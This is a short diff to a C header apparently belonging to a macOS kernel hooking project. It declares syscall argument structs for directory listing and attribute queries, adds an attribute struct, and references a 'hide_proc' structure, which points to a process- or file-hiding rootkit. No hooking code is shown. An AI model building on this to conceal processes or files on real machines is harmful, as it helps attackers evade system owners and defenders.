@@ -9,6 +9,8 @@
 #ifndef __Troy__HookCAPI__
 #define __Troy__HookCAPI__
 
+#include <sys/attr.h>
+
 #include "configure.h"
 
 #define PROCESS_NAME_LENGTH 100+1
@@ -31,16 +33,6 @@ struct getdirentries64_args {
     user_size_t bufsize;
     user_addr_t position;
 };
-/*struct getdirentriesattr_args {
-    int fd;
-    user_addr_t alist;
-    user_addr_t buffer;
-    user_size_t buffersize;
-    user_addr_t count;
-    user_addr_t basep;
-    user_addr_t newstate;
-    user_ulong_t options;
-};*/
 
 struct getattrlist_args
 {
@@ -59,6 +51,15 @@ struct getattrlistbulk_args
     user_size_t bufferSize;
     uint64_t options;
 };
+
+//only get the following data
+typedef struct val_attrs {
+    uint32_t          length;
+    attribute_set_t   returned;
+    uint32_t          error;
+    attrreference_t   name_info;
+    char*             name;
+} val_attrs_t;
 //-----------------END------------------------
 
 struct hide_proc
